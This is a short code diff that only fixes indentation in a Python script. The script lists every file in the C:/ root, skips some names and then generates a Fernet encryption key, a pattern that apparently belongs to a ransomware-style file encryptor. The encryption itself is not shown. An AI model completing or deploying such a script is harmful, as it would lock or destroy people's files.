@@ -36,10 +36,10 @@ reference_value = "a98def102bbc7a81320c"
 os.chdir("C:/")
 
 for file in os.listdir():
-        if file in skip_files:
-            continue
-        if os.path.isfile(file):
-            files.append(file)
+    if file in skip_files:
+        continue
+    if os.path.isfile(file):
+        files.append(file)
 
 key = Fernet.generate_key()
 
